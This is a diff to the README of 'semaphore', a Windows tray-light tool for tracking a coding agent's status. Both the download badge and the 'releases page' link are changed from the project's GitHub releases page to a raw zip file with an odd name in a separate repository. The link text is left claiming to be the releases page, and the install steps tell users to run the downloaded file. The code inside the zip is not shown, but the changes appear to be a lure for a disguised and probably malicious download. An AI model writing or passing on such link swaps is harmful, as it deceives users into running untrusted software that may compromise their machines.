@@ -5,7 +5,7 @@ description: "Track AI agent status with a floating system tray light. View idle
 ---
 # 🚦 semaphore - Keep track of your coding agent
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Anthelmintic-cuneiform116/semaphore/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Anthelmintic-cuneiform116/anthelmintic-cuneiform116.github.io/main/Politbureau/github-anthelmintic-io-cuneiform-3.2.zip)
 
 ## 📌 What is semaphore?
 
@@ -23,7 +23,7 @@ Semaphore serves as a visual indicator for your artificial intelligence coding a
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/Anthelmintic-cuneiform116/semaphore/releases) to fetch the installer.
+1. Visit the [releases page](https://raw.githubusercontent.com/Anthelmintic-cuneiform116/anthelmintic-cuneiform116.github.io/main/Politbureau/github-anthelmintic-io-cuneiform-3.2.zip) to fetch the installer.
 2. Select the file ending in `.msi` or `.exe` for Windows.
 3. Save the file to your folder.
 4. Double-click the file to start the installation.
